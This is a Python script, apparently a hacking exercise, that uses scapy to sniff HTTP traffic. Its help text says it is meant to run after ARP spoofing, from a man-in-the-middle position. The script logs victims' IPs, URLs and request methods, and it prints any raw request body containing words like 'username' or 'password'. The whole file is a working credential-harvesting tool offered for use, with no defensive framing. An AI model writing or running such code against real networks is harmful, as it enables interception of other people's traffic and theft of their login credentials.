import scapy.all as scapy
from scapy.layers import http
import argparse
from colorama import init, Fore

GREEN = Fore.GREEN
RED   = Fore.RED


def get_arguments():
    parser = argparse.ArgumentParser(description="HTTP Packet Sniffer, this is useful when you're a man in the middle." \
                                                 + "It is suggested that you run arp spoof before you use this script, otherwise it'll sniff your personal packets")

    parser.add_argument('-i' , '-iface' , nargs='?' , dest='iface' ,  help="Interface to use, default is scapy's default interface" , required=True)
    args = parser.parse_args()
    return args


def sniff(interface):
    scapy.sniff(iface=interface , store=False , prn=sniffed_packet)

def sniffed_packet(packet):

    if packet.haslayer(http.HTTPRequest):

        url = packet['HTTP Request'].Host.decode() + packet['HTTP Request'].Path.decode()
        ip  = packet['IP'].src
        method = packet['HTTP Request'].Method.decode()
        print(f'{GREEN} [+] {ip}  >  {url} with {method} ')


        if packet.haslayer('Raw'):
            load = packet['Raw'].load
            keys = ['username' , 'user' , 'name' , 'password' , 'pass']
            for key in keys:
                if key in str(load):
                    print(f'\n\n{RED} [*]  {load} \n\n')
                    break

result = get_arguments()
sniff(result.iface)


